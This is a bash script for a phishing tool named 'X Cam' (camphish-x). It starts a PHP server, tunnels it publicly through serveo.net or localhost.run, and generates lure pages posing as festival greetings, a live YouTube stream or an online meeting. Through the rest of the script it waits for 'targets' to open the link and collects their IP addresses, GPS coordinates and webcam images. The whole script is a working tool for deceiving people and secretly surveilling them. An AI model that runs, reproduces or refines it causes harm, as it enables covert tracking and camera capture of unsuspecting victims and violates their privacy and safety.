#!/bin/bash

trap 'printf "\n"; stop' 2

check_windows() {
    is_windows=false
    if [[ "$OS" == "Windows_NT" ]]; then
        is_windows=true
    else
        unameOut=$(uname -s 2>/dev/null || echo "")
        case "$unameOut" in
            *CYGWIN*|*MINGW*|*MSYS*) is_windows=true ;;
            *) is_windows=false ;;
        esac
    fi
    if [[ "$is_windows" == true ]]; then
        times_file="$(pwd)/times-opened.txt"
        # ensure file exists
        if [[ ! -f "$times_file" ]]; then
            printf "0" > "$times_file"
        fi
        # read, increment and save
        count=$(cat "$times_file" 2>/dev/null || echo 0)
        if ! [[ "$count" =~ ^[0-9]+$ ]]; then count=0; fi
        count=$((count+1))
        printf "%d" "$count" > "$times_file"
        messages=(
            "This tool requires Linux or Termux. (#N)"
            "Platform not supported. (#N)"
        )
        idx=$(( (count-1) % ${#messages[@]} ))
        msg="${messages[$idx]}"
        msg="${msg//\#N/$count}"
        printf "\n\e[1;33m[!] %s\n\n\e[0m" "$msg"
        exit 1
    fi
}
check_windows
banner() {
    clear
    printf "\n"
    printf "\e[1;91m  /*\e[1;31m++\e[0;31m---------------------------------\e[1;31m++\e[1;91m*\e[0;31m\\\e[0m\n"
    printf "\e[1;91m  |\e[1;31m+\e[0m                                                                \e[1;31m+\e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[1;91m####  ####\e[0m     \e[1;91m#######\e[0m   \e[1;95m#####\e[0m   \e[1;95m####  ####\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[1;91m ####  ####\e[0m    \e[1;91m###  ###\e[0m   \e[1;95m## ##\e[0m   \e[1;95m####  ####\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[1;91m  ########\e[0m     \e[0;91m###  ###\e[0m   \e[1;95m##  #\e[0m   \e[1;95m##########\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[1;91m ####  ####\e[0m    \e[0;91m###  ###\e[0m   \e[0;95m##  #\e[0m   \e[0;95m####  ####\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[1;91m####  ####\e[0m     \e[0;95m#######\e[0m   \e[0;95m#####\e[0m   \e[0;35m####  ####\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[1;91m##\e[0m \e[1;91m##\e[0m \e[0;91m##\e[0m \e[0;91m##\e[0m     \e[0;91m##\e[0m \e[0;91m##\e[0m \e[0;91m##\e[0m   \e[0;95m##\e[0m \e[0;95m##\e[0m   \e[0;95m##\e[0m \e[0;35m##\e[0m \e[0;35m##\e[0m \e[0;35m##\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[1;91m▓▓\e[0m \e[0;91m▓▓\e[0m \e[0;91m▓▓\e[0m \e[0;91m▓▓\e[0m     \e[0;91m▓▓\e[0m \e[0;91m▓▓\e[0m \e[0;95m▓▓\e[0m   \e[0;95m▓▓\e[0m \e[0;95m▓▓\e[0m   \e[0;95m▓▓\e[0m \e[0;35m▓▓\e[0m \e[0;35m▓▓\e[0m \e[0;35m▓▓\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[0;91m▒▒\e[0m \e[0;91m▒▒\e[0m \e[0;91m▒▒\e[0m \e[0;91m▒▒\e[0m     \e[0;91m▒▒\e[0m \e[0;95m▒▒\e[0m \e[0;95m▒▒\e[0m   \e[0;95m▒▒\e[0m \e[0;95m▒▒\e[0m   \e[0;95m▒▒\e[0m \e[0;35m▒▒\e[0m \e[0;35m▒▒\e[0m \e[0;35m▒▒\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m   \e[0;91m░░\e[0m \e[0;91m░░\e[0m \e[0;91m░░\e[0m \e[0;91m░░\e[0m     \e[0;95m░░\e[0m \e[0;95m░░\e[0m \e[0;95m░░\e[0m   \e[0;95m░░\e[0m \e[0;95m░░\e[0m   \e[0;35m░░\e[0m \e[0;35m░░\e[0m \e[0;35m░░\e[0m \e[0;35m░░\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m    \e[0;91m▓\e[0m  \e[0;91m▒\e[0m  \e[0;91m░\e[0m  \e[0;91m▓\e[0m      \e[0;95m▓\e[0m  \e[0;95m▒\e[0m  \e[0;95m░\e[0m    \e[0;95m▓\e[0m  \e[0;95m▒\e[0m    \e[0;35m▓\e[0m  \e[0;35m▒\e[0m  \e[0;35m░\e[0m  \e[0;35m▓\e[0m                     \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m                                                                \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[0m      \e[0;90m[\e[1;35mInfinity x White Devels Team\e[0;90m]\e[0m                                 \e[1;91m|\e[0m\n"
    printf "\e[1;91m  |\e[1;31m+\e[0m                                                                \e[1;31m+\e[1;91m|\e[0m\n"
    printf "\e[1;91m  \\\e[0;31m*\e[1;31m++\e[0;31m---------------------------------\e[1;31m++\e[1;91m*/\e[0m\n"
    printf "\e[1;95m        Simple 'CLI' Webcam + GPS Capture via Link • v3.0\e[0m\n"
    printf "\e[0;90m        [https://github.com/Adil-fayyaz/camphish-x]\e[0m\n\n"
}
dependencies() {
    if ! command -v php > /dev/null 2>&1; then
        printf "\e[1;91m  [!] PHP not found. Run: sudo apt install php\e[0m\n"
        exit 1
    fi
    if ! command -v ssh > /dev/null 2>&1; then
        printf "\e[1;91m  [!] SSH not found. Run: sudo apt install ssh\e[0m\n"
        exit 1
    fi
    printf "\e[1;92m  [✓] Ready\e[0m\n"
}
stop() {
    pkill -P $$ > /dev/null 2>&1
    pkill -f -2 php > /dev/null 2>&1
    pkill -f -2 ssh > /dev/null 2>&1
    jobs -p | xargs -r kill > /dev/null 2>&1
    if [[ -f ".monitor_pid" ]]; then
        monitor_pid=$(cat .monitor_pid 2>/dev/null)
        kill $monitor_pid 2>/dev/null
        rm -f .monitor_pid
    fi
    rm -f sendlink ip.txt location_* LocationLog.log Log.log > /dev/null 2>&1
    printf "\n\e[1;95m  X Cam - Created by Infinity x White Devels Team\e[0m\n"
    exit 1
}
catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;92m  ✓ IP:\e[0m %s\n" "$ip"
    cat ip.txt >> saved.ip.txt
}
catch_location() {
    if [[ -e "current_location.txt" ]]; then
        printf "\e[1;92m  ✓ Location:\e[0m\n"
        grep -v -E "Location data sent|getLocation called|Geolocation error" current_location.txt
        mv current_location.txt "saved_locations/$(date +%s).txt"
    elif [[ -e "location_"* ]]; then
        loc_file=$(ls location_* | head -1)
        lat=$(grep -a 'Latitude:' "$loc_file" | cut -d " " -f2)
        lon=$(grep -a 'Longitude:' "$loc_file" | cut -d " " -f2)
        acc=$(grep -a 'Accuracy:' "$loc_file" | cut -d " " -f2)
        maps=$(grep -a 'Google Maps:' "$loc_file" | cut -d " " -f3)
        printf "\e[1;92m     Lat:\e[0m %s \e[1;92mLon:\e[0m %s\n" "$lat" "$lon"
        printf "\e[1;92m     Maps:\e[0m %s\n" "$maps"
        [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
        mv "$loc_file" "saved_locations/"
        printf "\e[1;92m  ✓ Saved\e[0m\n"
    else
        printf "\e[1;91m  [!] No location found\e[0m\n"
    fi
}
checkfound() {
    [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
    printf "\n\e[1;35m  +------------------ STATUS ------------------+\e[0m\n"
    printf "\e[1;92m  [✓] Waiting for targets... Ctrl+C to stop\e[0m\n"
    printf "\e[1;92m  [✓] GPS + Webcam: ACTIVE\e[0m\n"
    printf "\e[1;35m  +---------------------------------------------+\e[0m\n"
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m  ✓ Target opened link!\e[0m\n"
            catch_ip
            rm -f ip.txt
        fi
        if [[ -e "LocationLog.log" ]] || [[ -e "current_location.txt" ]]; then
            printf "\n\e[1;92m  ✓ Location received!\e[0m\n"
            catch_location
            rm -f LocationLog.log
        fi
        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;92m  ✓ Camera image received!\e[0m\n"
            rm -f Log.log
        fi
        sleep 0.5
    done
}
get_link_label() {
    case "$option_tem" in
        1) printf "Celebrate %s: %s" "$fest_name" "$1" ;;
        2) printf "Watch live: %s" "$1" ;;
        3) printf "Join meeting: %s" "$1" ;;
        *) printf "%s" "$1" ;;
    esac
}

serveo_tunnel() {
    printf "\e[1;93m  ► Starting server...\e[0m\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;93m  ► Starting tunnel...\e[0m\n"
    sub=""
    case "$option_tem" in
        1) sub=$(echo "$fest_name" | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9' | head -c 12)
           [[ -z "$sub" ]] && sub="greetings"
           sub="${sub}-wishes" ;;
        2) sub="live-tv" ;;
        3) sub="join-meeting" ;;
        *) sub="join" ;;
    esac
    rnd=$((RANDOM % 9000 + 1000))
    sub="${sub}-${rnd}"
    ssh -o StrictHostKeyChecking=accept-new -R "${sub}:80:localhost:3333" serveo.net > serveo.log 2>&1 &
    sleep 8
    if ! pgrep -f "ssh.*serveo" > /dev/null; then
        printf "\e[1;31m[!] Serveo failed to start.\e[0m\n"
        exit 1
    fi
    link=$(grep -o 'https://[a-zA-Z0-9-]*\.serveo\.net' serveo.log | head -1)
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Could not retrieve Serveo URL.\e[0m\n"
        exit 1
    fi
    label=$(get_link_label "$link")
    printf "\n\e[1;96m  ─────────────────────────────────────\e[0m\n"
    printf "\e[1;92m  ✓ Link:\e[0m %s\n" "$label"
    printf "\e[1;96m  ─────────────────────────────────────\e[0m\n"
    echo "$link" > sendlink
    echo "$label" > share.txt
    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;92m  ✓ Copied to clipboard\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;92m  ✓ Copied to clipboard\e[0m\n"; fi
    if command -v qrencode > /dev/null 2>&1; then qrencode -t ANSIUTF8 "$link" 2>/dev/null; fi
    payload_template "$link"
    checkfound
}
localhost_run_tunnel() {
    printf "\e[1;93m  ► Starting server...\e[0m\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;93m  ► Starting tunnel...\e[0m\n"
    ssh -o StrictHostKeyChecking=accept-new -R 80:127.0.0.1:3333 nokey@localhost.run > localhostrun.log 2>&1 &
    ssh_pid=$!
    sleep 5
    if ! ps -p $ssh_pid > /dev/null; then
        printf "\e[1;31m[!] localhost.run SSH failed to start.\e[0m\n"
        exit 1
    fi
    printf "\e[1;93m  ► Waiting for URL...\e[0m\n"
    link=""
    attempts=0
    while [[ -z "$link" && $attempts -lt 20 ]]; do
        if [[ -f "localhostrun.log" ]]; then
            link=$(grep -oE 'https://[a-zA-Z0-9]+\.lhr\.life' localhostrun.log | tail -1)
        fi
        sleep 1
        ((attempts++))
    done
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Could not retrieve localhost.run URL.\e[0m\n"
        exit 1
    fi
    label=$(get_link_label "$link")
    printf "\n\e[1;96m  ─────────────────────────────────────\e[0m\n"
    printf "\e[1;92m  ✓ Link:\e[0m %s\n" "$label"
    printf "\e[1;96m  ─────────────────────────────────────\e[0m\n"
    echo "$link" > sendlink
    echo "$label" > share.txt
    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;92m  ✓ Copied to clipboard\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;92m  ✓ Copied to clipboard\e[0m\n"; fi
    if command -v qrencode > /dev/null 2>&1; then qrencode -t ANSIUTF8 "$link" 2>/dev/null; fi
    payload_template "$link"
    (
        last_url="$link"
        while true; do
            sleep 10
            if ! ps -p $PPID > /dev/null 2>&1; then
                exit 0
            fi
            if [[ -f "localhostrun.log" ]]; then
                new_url=$(grep -oE 'https://[a-zA-Z0-9]+\.lhr\.life' localhostrun.log | tail -1)
                if [[ -n "$new_url" && "$new_url" != "$last_url" ]]; then
                    printf "\n\e[1;93m  [!] URL changed:\e[0m\n"
                    label=$(get_link_label "$new_url")
                    printf "\e[1;92m  ✓ %s\e[0m\n" "$label"
                    echo "$new_url" > sendlink
                    last_url="$new_url"
                    payload_template "$new_url"
                fi
            fi
        done
    ) &
    monitor_pid=$!
    echo $monitor_pid > .monitor_pid
    checkfound
}
payload_template() {
    local forwarding_link="$1"
    if [[ ! -f "xcam-template.php" ]]; then
        printf "\e[1;31m[!] Error: xcam-template.php not found!\e[0m\n"
        return 1
    fi
    sed "s|forwarding_link|$forwarding_link|g" xcam-template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        if [[ ! -f "xcam-festivalwishes.html" ]]; then
            printf "\e[1;31m[!] Error: xcam-festivalwishes.html not found!\e[0m\n"
            return 1
        fi
        if [[ "$fest_variant" -eq 2 ]]; then
            template_file="xcam-festivalwishes-islamic.html"
        else
            template_file="xcam-festivalwishes.html"
        fi
        escaped_fest_name=$(printf '%s' "$fest_name" | sed 's/[\\/&]/\\&/g')
        sed "s|forwarding_link|$forwarding_link|g; s|fes_name|$escaped_fest_name|g" "$template_file" > index2.html
        cp index2.html index.html
    elif [[ $option_tem -eq 2 ]]; then
        if [[ ! -f "xcam-liveyttv.html" ]]; then
            printf "\e[1;31m[!] Error: xcam-liveyttv.html not found!\e[0m\n"
            return 1
        fi
        sed "s|forwarding_link|$forwarding_link|g" xcam-liveyttv.html > index2.html
        sed "s|live_yt_tv|$yt_video_ID|g" index2.html > index.html
    else
        if [[ ! -f "xcam-onlinemeeting.html" ]]; then
            printf "\e[1;31m[!] Error: xcam-onlinemeeting.html not found!\e[0m\n"
            return 1
        fi
        sed "s|forwarding_link|$forwarding_link|g" xcam-onlinemeeting.html > index.html
        cp index.html index2.html
    fi
    if [[ -f "index.html" ]]; then
        printf "\e[1;92m  ✓ Template ready\e[0m\n"
    else
        printf "\e[1;31m[!] Error: Failed to generate index.html\e[0m\n"
        return 1
    fi
}
select_template() {
    while true; do
        printf "\e[1;97m  [01] Festival Wishing\e[0m\n"
        printf "\e[1;97m  [02] Live YouTube TV\e[0m\n"
        printf "\e[1;97m  [03] Online Meeting\e[0m\n"
        printf "\e[1;35m  ------------------------------------------\e[0m\n"
        read -p $'\n\e[1;91m  [X Cam] Choose template [01]: \e[0m' option_tem
        option_tem="${option_tem:-1}"
        case "$option_tem" in
            1|01) read -p $'\e[1;93m  [*] Festival name: \e[0m' fest_name;
               fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//');
               [[ -z "$fest_name" ]] && fest_name="Festival"
               read -p $'\e[1;93m  [*] Style: [1]Indian  [2]Islamic [1]: \e[0m' fest_variant
               fest_variant="${fest_variant:-1}"
               break ;;
            2|02) read -p $'\e[1;93m  [*] YouTube video ID: \e[0m' yt_video_ID;
               [[ -z "$yt_video_ID" ]] && yt_video_ID="dQw4w9WgXcQ"
               break ;;
            3|03) break ;;
            *) printf "\e[1;91m  [!] Invalid. Enter 01, 02 or 03\e[0m\n"; sleep 1 ;;
        esac
    done
}
choose_tunnel() {
    while true; do
        printf "\e[1;35m  ---------------- TUNNELS ----------------\e[0m\n"
        printf "\e[1;97m  [01] Serveo.net \e[0;90m(fast)\e[0m\n"
        printf "\e[1;97m  [02] localhost.run \e[0;90m(backup)\e[0m\n"
        printf "\e[1;35m  ------------------------------------------\e[0m\n"
        read -p $'\n\e[1;91m  [X Cam] Choose tunnel [01]: \e[0m' option_server
        option_server="${option_server:-1}"
        case "$option_server" in
            1|01) serveo_tunnel; return ;;
            2|02) localhost_run_tunnel; return ;;
            *) printf "\e[1;91m  [!] Invalid. Enter 01 or 02\e[0m\n"; sleep 1 ;;
        esac
    done
}

main_flow() {
    if [[ -f ".monitor_pid" ]]; then
        old_monitor=$(cat .monitor_pid 2>/dev/null)
        kill $old_monitor 2>/dev/null
        rm -f .monitor_pid
    fi
    rm -f sendlink ip.txt serveo.log localhostrun.log
    printf "\e[1;35m  ---------------- TEMPLATES ----------------\e[0m\n"
    select_template
    choose_tunnel
}
banner
dependencies
main_flow